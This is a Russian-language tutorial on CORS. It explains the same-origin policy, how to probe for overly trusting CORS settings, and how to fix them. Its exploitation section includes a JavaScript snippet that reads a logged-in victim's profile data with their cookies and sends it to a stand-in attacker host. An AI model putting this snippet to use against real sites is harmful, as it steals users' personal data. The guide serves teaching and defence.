**CORS (Cross-Origin Resource Sharing)** — это механизм безопасности, реализованный в браузерах, который позволяет или запрещает веб-страницам делать запросы к домену, отличному от того, с которого была загружена сама страница.

Это не уязвимость сама по себе, а **защитная мера**, неправильная настройка которой приводит к серьезным дырам в безопасности (обычно это относится к категории **A01:2021 — Broken Access Control**).

---

### **1. Зачем нужен CORS? (Концепция SOP)**

Чтобы понять CORS, нужно знать про SOP (Same-Origin Policy).

SOP — это главное правило браузера: «Сайт А не может читать данные с сайта Б». Без него любой вредоносный сайт, который вы открыли во второй вкладке, мог бы прочитать вашу переписку в соцсетях или украсть банковские токены, используя ваши активные куки.

**CORS** — это контролируемое «исключение» из правила SOP. Он нужен, когда сайту `frontend.com` легально необходимо получить данные с `api.backend.com`.

---

### **2. Как работает механизм (Handshake)**

Когда браузер видит «кросс-доменный» запрос, он выполняет следующие шаги:

1. **Simple Request (Простой запрос):** Если запрос простой (например, GET), браузер отправляет его и добавляет заголовок `Origin: https://frontend.com`. Сервер отвечает, и если в ответе есть заголовок `Access-Control-Allow-Origin: https://frontend.com`, браузер разрешает JS-коду прочитать ответ.
    
2. **Preflight Request (Предварительный запрос):** Если запрос сложный (JSON, метод PUT/DELETE, кастомные заголовки), браузер сначала отправляет запрос методом **OPTIONS**.
    
    - _Браузер:_ «Эй, сервер, можно ли сайту А отправить тебе POST с JSON?»
        
    - _Сервер:_ «Да, можно» (отвечает заголовками `Access-Control-Allow-Methods` и `Allow-Origin`).
        
    - _Браузер:_ «Окей, отправляю реальный запрос».

### **3. Методология поиска уязвимостей (Как искать пентестеру)**

Пентестер ищет **слишком доверительные настройки** сервера.

- **Отражение Origin:**
    
    - Отправьте запрос с заголовком `Origin: https://evil.com`.
        
    - Если сервер ответил `Access-Control-Allow-Origin: https://evil.com`, значит, он доверяет любому домену.
        
- **Использование Wildcard с учетными данными:**
    
    - Если `Access-Control-Allow-Origin: *` (звездочка), браузер запрещает передачу кук. Но если разработчик настроил сервер так, что он динамически подставляет домен из запроса в заголовок и при этом ставит `Access-Control-Allow-Credentials: true` — это критическая дыра.
        
- **Ошибки в регулярных выражениях:**
    
    - Если разрешен `trust.com`, попробуйте `trust.com.evil.com` или `eviltust.com`. Часто программисты плохо проверяют поддомены.
        
- **Доверие к `null`:**
    
    - Некоторые разработчики разрешают `Origin: null` (используется локальными файлами). Атакующий может инициировать запрос через `iframe`, который выдаст `null`.

### **4. Как эксплуатировать (Написание эксплойта)**

Если вы нашли, что сервер доверяет любому домену и разрешает куки (`Allow-Credentials`), вы можете украсть данные пользователя.

**Сценарий:**

1. Жертва залогинена на `victim-bank.com`.
    
2. Жертва заходит на ваш вредоносный сайт `evil.com`.
    
3. На `evil.com` запущен JS-код:
    

JavaScript

```
// Эксплойт для кражи данных профиля
fetch('https://victim-bank.com/api/user_info', {
    method: 'GET',
    credentials: 'include' // Отправляем куки жертвы
})
.then(response => response.json())
.then(data => {
    // Отправляем украденные данные на сервер хакера
    fetch('https://hacker.com/log?data=' + JSON.stringify(data));
});
```

Если CORS настроен неправильно, браузер разрешит этому коду прочитать JSON с личными данными жертвы, так как сервер подтвердил, что доверяет `evil.com`.

### **6. Как исправить (Рекомендация разработчику)**

1. **Никаких звездочек (`*`):** Никогда не используйте `Access-Control-Allow-Origin: *`, если требуется аутентификация по кукам или токенам.
    
2. **Белый список (Allow-list):** На сервере должен быть жесткий список разрешенных доменов (например, `frontend.com` и `mobile-app.io`).
    
3. **Избегайте отражения:** Не берите значение из заголовка `Origin` и не вставляйте его в ответ без проверки.
    
4. **Правильные заголовки:**
    
    - `Access-Control-Allow-Origin: https://specific-domain.com`
        
    - `Access-Control-Allow-Credentials: true` (только если действительно нужно).
        
5. **Vary: Origin:** Если сервер поддерживает несколько доменов, он должен возвращать заголовок `Vary: Origin`, чтобы кеширующие прокси-серверы не отдавали заголовок для одного сайта другому.
